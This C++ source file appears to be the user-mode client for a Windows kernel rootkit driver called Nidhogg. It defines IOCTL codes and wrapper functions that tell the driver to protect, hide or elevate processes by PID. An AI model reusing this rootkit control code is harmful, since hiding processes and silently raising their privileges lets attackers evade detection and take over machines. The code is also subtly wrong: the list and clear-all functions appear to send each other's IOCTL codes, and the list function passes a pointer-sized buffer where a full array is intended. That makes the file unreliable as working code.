#include <Windows.h>
#include <vector>

// ** IOCTL ********************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_BY_PID CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_BY_PID CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PID_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PID CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_BY_PID CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_BY_PID CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *****************************************************************************************************

// ** General Definitions ******************************************************************************
#define MAX_PIDS 256
#define NIDHOGG_SUCCESS 0
#define NIDHOGG_ERROR_CONNECT_DRIVER 1
#define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 2
// ******************************************************************************************************

int NidhoggProcessProtect(std::vector<DWORD> pids) {
    DWORD bytes;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hFile == INVALID_HANDLE_VALUE)
		return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_BY_PID,
			            pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
			            nullptr, 0, &bytes, nullptr)) {
            CloseHandle(hFile);
            return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
        }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessUnprotect(std::vector<DWORD> pids) {
    DWORD bytes;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hFile == INVALID_HANDLE_VALUE)
		return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_BY_PID,
			            pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
			            nullptr, 0, &bytes, nullptr)) {

            CloseHandle(hFile);
            return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
        }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggListProtectedProcesses(DWORD pidsList[MAX_PIDS]) {
    DWORD bytes;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hFile == INVALID_HANDLE_VALUE)
		return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_PID_PROTECTION, &pidsList, sizeof(pidsList), nullptr, 0, &bytes, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessClearAllProtection() {
    DWORD bytes;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hFile == INVALID_HANDLE_VALUE)
		return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_PID,
			nullptr, 0, nullptr, 0, &bytes, nullptr)) {
            CloseHandle(hFile);
            return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
        }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessHide(std::vector<DWORD> pids) {
    DWORD bytes;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hFile == INVALID_HANDLE_VALUE)
		return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_HIDE_BY_PID,
			pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
			nullptr, 0, &bytes, nullptr)) {

            CloseHandle(hFile);
            return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
        }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessElevate(std::vector<DWORD> pids) {
    DWORD bytes;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hFile == INVALID_HANDLE_VALUE)
		return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_ELEVATE_BY_PID,
			pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
			nullptr, 0, &bytes, nullptr)) {

            CloseHandle(hFile);
            return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
        }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}
